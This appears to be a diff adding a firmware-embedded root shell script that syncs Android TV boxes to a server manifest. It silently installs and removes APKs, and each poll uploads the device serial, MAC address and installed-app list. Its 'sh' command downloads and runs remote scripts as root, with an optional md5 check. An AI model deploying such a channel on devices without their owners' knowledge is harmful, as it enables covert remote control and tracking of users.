@@ -1,0 +1,351 @@
+#!/system/bin/sh
+# tv-updater (UNT401H / Hi3798MV310 固件植入版) —— 盒子端声明式应用同步器（Android 4.4+ / root 固件）
+#
+# 原理：循环轮询服务器上的清单（期望状态），逐条与本地比对后收敛：
+#   install|包名|md5|url   ：未安装则安装；已装但 md5 不一致则自动更新
+#   remove|包名            ：已安装则卸载
+#   cmd|序号|动作|参数      ：远程指令（白名单动作，序号去重，只执行一次）
+# 任何一台盒子只要联网，最终都会收敛到服务器声明的状态。
+#
+# 依赖：root 固件；busybox（wget / md5sum / sed / date）。
+# 部署：本脚本 /system/bin/tv-updater（0755），配置 /system/etc/tv-updater.conf，
+#       由 /system/etc/install-recovery-2.sh 开机拉起（含看门狗）。
+#
+# 用法：tv-updater          常驻轮询模式（开机自启用这个）
+#      tv-updater once     只同步一轮就退出（运维排障 / 测试用）
+
+# 配置路径可用环境变量 TVUPD_CONF 覆盖（测试期不写 /system 用）
+CONF=${TVUPD_CONF:-/system/etc/tv-updater.conf}
+WORK=/data/local/tv-updater
+LOG=$WORK/last.log
+
+[ -f "$CONF" ] || exit 1
+. "$CONF"
+
+# 老固件的 busybox date 默认按 UTC 输出，日志时间会比本地时间差 8 小时。
+# 用 POSIX TZ 字符串纠正，不依赖 /system/usr/share/zoneinfo 是否存在。
+export TZ=CST-8
+
+# busybox 定位：本机 shell 的 PATH 可能不带 busybox，toolbox 又缺 wget/date/cut，
+# 这里显式探测常用路径，找不到再退回系统命令（此时 wget 等会失败，日志里能看出来）。
+# 注意别写成 "[ -n "$BB" ] || cmd && BB=xxx" —— shell 的 || && 短路会无条件执行后半句。
+BB=""
+for c in /system/bin/busybox /system/xbin/busybox /system/bin/busybox-armv7l busybox; do
+    if [ -x "$c" ]; then BB="$c"; break; fi
+done
+if [ -z "$BB" ]; then
+    command -v busybox >/dev/null 2>&1 && BB=busybox
+fi
+
+# 统一走 busybox 的调用入口：有 busybox 用 applet，没有退回系统命令
+b() {
+    if [ -n "$BB" ]; then
+        $BB "$@"
+    else
+        "$@"
+    fi
+}
+
+log() {
+    echo "$(b date '+%F %T') $*" >> "$LOG" 2>/dev/null
+}
+
+md5_of() {
+    b md5sum "$1" 2>/dev/null | b cut -d' ' -f1
+}
+
+download() {
+    # -T 30：网络读超时。不加的话，遇到半死不活的连接 wget 会永久挂住，
+    # 整个 updater 就此僵死到下一条指令（历史上真踩过），加超时保证自愈。
+    b wget -q -T 30 -O "$2" "$1"
+}
+
+# ---- DNS 兼容层 ----
+# 静态编译的 busybox 在安卓上 getaddrinfo 经常不可用（报 bad address），
+# 而安卓系统自身的 DNS（netd）是好的。这里用系统 ping 解析域名（走 netd），
+# 再以 IP + Host 头方式下载，绕开 busybox 的解析缺陷。结果缓存 10 分钟。
+
+resolve_host() {
+    h=$1
+    b mkdir -p "$WORK/dns" 2>/dev/null
+    C="$WORK/dns/$h"
+    now=$(b date +%s)
+    if [ -s "$C" ]; then
+        t=$(b cut -d' ' -f1 "$C" 2>/dev/null)
+        cip=$(b cut -d' ' -f2 "$C" 2>/dev/null)
+        if [ -n "$t" ] && [ -n "$cip" ] && [ $((now - t)) -lt 600 ]; then
+            echo "$cip"; return 0
+        fi
+    fi
+    ip=$(ping -c 1 -W 2 "$h" 2>/dev/null | b grep -o '([0-9.]*)' | b sed -n 's/[()]//g;1p')
+    if [ -n "$ip" ]; then
+        echo "$now $ip" > "$C"
+        echo "$ip"; return 0
+    fi
+    return 1
+}
+
+# 把 URL 中的域名替换为解析出的 IP；本身是 IP 或非 http 的 URL 原样返回
+resolve_url() {
+    u=$1
+    case "$u" in http://*) ;; *) echo "$u"; return 0 ;; esac
+    rest=${u#http://}
+    hp=${rest%%/*}
+    host=${hp%%:*}
+    port=${hp#"$host"}
+    case "$rest" in */*) path=${rest#"$hp"} ;; *) path=/ ;; esac
+    case "$host" in *[!0-9.]*) ;; *) echo "$u"; return 0 ;; esac   # 纯 IP
+    ip=$(resolve_host "$host") || return 1
+    echo "http://$ip$port$path"
+}
+
+url_host() {
+    u=${1#http://}
+    hp=${u%%/*}
+    echo "${hp%%:*}"
+}
+
+download_url() { # $1=url $2=out：支持域名的下载入口
+    ru=$(resolve_url "$1") || { log "域名解析失败: $1"; return 1; }
+    if [ "$ru" = "$1" ]; then
+        download "$1" "$2"
+    else
+        b wget -q -T 30 -O "$2" --header "Host: $(url_host "$1")" "$ru"
+    fi
+}
+
+# ---- 系统自述：身份 + 运行状态 + 应用清单摘要（随清单请求一起上报）----
+SELF_ID=""; SELF_MAC=""; SELF_MODEL=""; SELF_SDK=""
+SELF_UP=""; SELF_MEM=""; SELF_TN=""; SELF_TA=""
+
+sysinfo() {
+    SELF_ID=$(getprop ro.serialno 2>/dev/null | b sed 's/[^A-Za-z0-9_-]//g')
+    SELF_MAC=$(b cat /sys/class/net/wlan0/address 2>/dev/null | b sed 's/://g;s/[^A-Za-z0-9]//g')
+    [ -n "$SELF_MAC" ] || SELF_MAC=$(b cat /sys/class/net/eth0/address 2>/dev/null | b sed 's/://g;s/[^A-Za-z0-9]//g')
+    SELF_MODEL=$(getprop ro.product.model 2>/dev/null | b sed 's/[^A-Za-z0-9._-]/-/g')
+    SELF_SDK=$(getprop ro.build.version.sdk 2>/dev/null | b sed 's/[^0-9]//g')
+
+    U=$(b cut -d' ' -f1 /proc/uptime 2>/dev/null)
+    case "$U" in ''|*[!0-9.]*) U=0 ;; esac
+    SELF_UP=$(( ${U%.*} / 3600 ))
+    case "$SELF_UP" in ''|*[!0-9]*) SELF_UP=0 ;; esac
+
+    SELF_MEM=$(b free -m 2>/dev/null | b awk '/Mem:/{print $4+$6+$7; exit}')
+    case "$SELF_MEM" in ''|*[!0-9]*) SELF_MEM=0 ;; esac
+
+    SELF_TN=$(pm list packages -3 2>/dev/null | b grep -c .)
+    case "$SELF_TN" in ''|*[!0-9]*) SELF_TN=0 ;; esac
+    SELF_TA=$(pm list packages -3 2>/dev/null | b sed 's/^package://' | b sort | b tr '\n' ',')
+    # 本机 shell 无 printf，用 echo + tr 清洗（只留包名字符，避免污染 URL）
+    SELF_TA=$(echo "$SELF_TA" | b tr -cd 'A-Za-z0-9._,-' | b cut -c 1-400)
+}
+
+# ---- 远程指令通道 ----
+# 清单里的 cmd|序号|动作|参数 行。序号（nonce）执行过就记档，永不再执行 —— 这样
+# 清单可以长期保留指令行而不必反复删改。动作走白名单，不做任意 shell 执行，
+# 唯一能「跑脚本」的是 sh 动作：从我们自己的服务器下载脚本 + md5 校验后执行
+# （这就是远程救砖通道，和 APK 更新同一个信任级别）。
+CMD_DONE=$WORK/cmd.done
+CMD_REP=$WORK/cmdreport
+CMD_MAX=5          # 单轮最多执行几条指令，防止清单被塞爆
+CMD_RES=""
+
+cmd_seen() { b grep -qx "$1" "$CMD_DONE" 2>/dev/null; }
+cmd_mark() {
+    echo "$1" >> "$CMD_DONE" 2>/dev/null
+    n=$(b wc -l < "$CMD_DONE" 2>/dev/null)
+    case "$n" in ''|*[!0-9]*) return 0 ;; esac
+    if [ "$n" -gt 200 ]; then      # 只保留最近 200 条，避免文件无限增长
+        b tail -n 200 "$CMD_DONE" > "$CMD_DONE.t" 2>/dev/null && b cat "$CMD_DONE.t" > "$CMD_DONE"
+        b rm -f "$CMD_DONE.t"
+    fi
+}
+cmd_note() { echo "$1|$2|$3" >> "$CMD_REP" 2>/dev/null; }
+
+run_cmd() { # $1=nonce $2=动作 $3=参数1 $4=参数2
+    NONCE=$1; VERB=$2; A1=$3; A2=$4
+    RES=fail
+    case "$VERB" in
+        report)                       # 只要回执，不做任何事
+            RES=ok ;;
+        reboot)                       # 立即重启
+            log "远程指令：重启盒子"
+            sync
+            RES=ok
+            cmd_note "$NONCE" "$VERB" "$RES"
+            cmd_mark "$NONCE"
+            reboot
+            return 0
+            ;;
+        memclean)   /system/bin/tv-maint mem force  && RES=ok ;;
+        clearcache) /system/bin/tv-maint cache      && RES=ok ;;
+        dns)        /system/bin/tv-maint dns        && RES=ok ;;
+        wifi)       /system/bin/tv-maint wifi       && RES=ok ;;
+        oem)        /system/bin/tv-maint oem        && RES=ok ;;
+        maint)      /system/bin/tv-maint all        && RES=ok ;;
+        status)     /system/bin/tv-maint status >> "$LOG" 2>&1 && RES=ok ;;
+        sh)                           # 下载脚本并执行（arg1=url, arg2=可选 md5）
+            if [ -z "$A1" ]; then log "指令 sh 缺少脚本 URL"; RES=fail
+            else
+                RC=$WORK/rc.sh
+                b rm -f "$RC"
+                if download_url "$A1" "$RC" && [ -s "$RC" ]; then
+                    if [ -n "$A2" ]; then
+                        GM=$(md5_of "$RC")
+                        if [ "$GM" != "$A2" ]; then
+                            log "远程脚本 md5 不符（期望 $A2 实得 $GM），拒绝执行"
+                            RES=md5fail
+                        fi
+                    fi
+                    if [ "$RES" != "md5fail" ]; then
+                        b chmod 755 "$RC"
+                        log "远程脚本开始执行 $A1"
+                        sh "$RC" >> "$LOG" 2>&1
+                        log "远程脚本执行结束（退出码 $?）"
+                        RES=ok
+                    fi
+                else
+                    log "远程脚本下载失败 $A1"
+                fi
+                b rm -f "$RC"
+            fi
+            ;;
+        *)
+            log "未知指令 $VERB"
+            RES=unknown
+            ;;
+    esac
+    cmd_note "$NONCE" "$VERB" "$RES"
+    cmd_mark "$NONCE"
+    log "远程指令 $VERB -> $RES"
+}
+
+sync_once() {
+    b mkdir -p "$WORK" 2>/dev/null
+    : > "$LOG"
+
+    # 0. 采集自身状态（身份 + 运行时长 + 可用内存 + 应用清单摘要）
+    sysinfo
+
+    # 1. 拉取期望状态清单（附身份与状态，服务器按身份分发专属方案并记档）
+    M=$WORK/apps.txt.new
+    MBASE=$(echo "$MANIFEST_URL" | b sed 's/\?.*//')
+
+    # 上一轮指令的回执，挂在本轮请求上带给服务器（发完即清）
+    CREP=""
+    if [ -s "$CMD_REP" ]; then
+        CREP=$(b cat "$CMD_REP" | b tr '\n' ';' | b tr -cd 'A-Za-z0-9._:;,-' | b cut -c 1-400)
+    fi
+
+    Q="?t=$(b date +%s)&id=$SELF_ID&mac=$SELF_MAC&model=$SELF_MODEL&sdk=$SELF_SDK&group=$GROUP"
+    Q="$Q&up=$SELF_UP&mem=$SELF_MEM&tn=$SELF_TN&ta=$SELF_TA"
+    [ -n "$CREP" ] && Q="$Q&cmd=$CREP"
+
+    download_url "$MBASE$Q" "$M" || { log "拉取清单失败，跳过本轮"; return 1; }
+    b rm -f "$CMD_REP"
+    if ! grep -q -v '^#' "$M" 2>/dev/null; then log "清单为空"; return 1; fi
+    # 兼容部分老 busybox mv 不支持 -f / 跨目录 mv 失败的问题：用 cat 覆盖写入
+    b cat "$M" > "$WORK/apps.txt" && b rm -f "$M"
+    if [ ! -s "$WORK/apps.txt" ]; then log "清单写入失败"; return 1; fi
+
+    # 2. 逐条收敛到期望状态
+    WANT=0; DID=0; CMDN=0
+    while IFS='|' read -r A B C D E F; do
+        case "$A" in ''|\#*) continue ;; esac
+
+        # ---- 远程指令 ----
+        if [ "$A" = "cmd" ]; then
+            case "$B" in ''|*[!A-Za-z0-9._-]*) continue ;; esac
+            cmd_seen "$B" && continue
+            if [ "$CMDN" -ge "$CMD_MAX" ]; then continue; fi
+            CMDN=$((CMDN + 1))
+            run_cmd "$B" "$C" "$D" "$E"
+            continue
+        fi
+
+        WANT=$((WANT + 1))
+        pkg=$B
+        [ -n "$pkg" ] || continue
+        cur=$(pm path "$pkg" 2>/dev/null | b sed -n 's/^package://p' | b sed -n '1p')
+
+        if [ "$A" = "remove" ]; then
+            if [ -n "$cur" ]; then
+                if pm uninstall "$pkg" 2>/dev/null; then log "已卸载 $pkg"; DID=$((DID + 1))
+                else log "卸载失败 $pkg"; fi
+            fi
+            continue
+        fi
+
+        if [ "$A" = "install" ]; then
+            if [ -z "$C" ] || [ -z "$D" ]; then log "条目不完整 $pkg"; continue; fi
+
+            # 已安装且 md5 一致 → 无需操作
+            if [ -n "$cur" ]; then
+                imd5=$(md5_of "$cur")
+                [ "$imd5" = "$C" ] && continue
+            fi
+
+            APK="$WORK/dl_$pkg.apk"
+            download_url "$D" "$APK" || { log "下载失败 $pkg"; b rm -f "$APK"; continue; }
+            dmd5=$(md5_of "$APK")
+            if [ "$dmd5" != "$C" ]; then log "校验失败 $pkg"; b rm -f "$APK"; continue; fi
+
+            if pm install -r "$APK" 2>/dev/null; then
+                log "已安装/更新 $pkg"; DID=$((DID + 1))
+            else
+                log "安装失败 $pkg"
+                # 常见原因：签名不一致（换包商）或版本号低于已装版本。
+                # REINSTALL_ON_FAIL=1 时先卸载再装（会丢应用本地数据）
+                if [ "$REINSTALL_ON_FAIL" = "1" ] && [ -n "$cur" ]; then
+                    pm uninstall "$pkg" >/dev/null 2>&1
+                    if pm install -r "$APK" 2>/dev/null; then log "卸载后重装成功 $pkg"; DID=$((DID + 1))
+                    else log "卸载后重装仍失败 $pkg"; fi
+                fi
+            fi
+            b rm -f "$APK"
+        fi
+    done < "$WORK/apps.txt"
+
+    # 3. 心跳上报（可选）：让服务器知道这台盒子还活着、干了什么
+    if [ -n "$HEARTBEAT_URL" ] && [ -n "$BB" ]; then
+        hu=$(resolve_url "$HEARTBEAT_URL")
+        [ -n "$hu" ] && $BB wget -q -T 30 -O /dev/null --header "Host: $(url_host "$HEARTBEAT_URL")" \
+            "$hu?id=$SELF_ID&group=$GROUP&up=$SELF_UP&mem=$SELF_MEM&tn=$SELF_TN" 2>/dev/null
+    fi
+
+    log "本轮同步完成：清单 $WANT 项，执行动作 $DID 项，远程指令 $CMDN 条"
+    return 0
+}
+
+# ---- 单轮模式：同步一次立即退出 ----
+if [ "$1" = "once" ]; then
+    sync_once
+    cat "$LOG"
+    exit 0
+fi
+
+# ---- 常驻模式（单实例锁）----
+b mkdir -p "$WORK" 2>/dev/null
+if [ -f "$WORK/lock" ]; then
+    OLDPID=$(cat "$WORK/lock" 2>/dev/null)
+    kill -0 "$OLDPID" 2>/dev/null && exit 0
+fi
+echo $$ > "$WORK/lock"
+
+# 开机先等网络与时钟就绪：
+#   老盒子没有 RTC 电池，冷启动时时钟从 2015-01-01 起算，框架联网后才对时。
+#   时钟不对会让日志时间错乱、也会让看门狗把日志误判成陈旧。
+#   最多等 150 秒；等不到也照常同步（同步逻辑本身不依赖准确时间）。
+b sleep 60
+i=0
+while [ $i -lt 18 ]; do
+    Y=$(b date +%Y 2>/dev/null)
+    case "$Y" in ''|*[!0-9]*) Y=0 ;; esac
+    [ "$Y" -ge 2020 ] && break
+    b sleep 5
+    i=$((i + 1))
+done
+while :; do
+    sync_once
+    b sleep "$INTERVAL"
+done
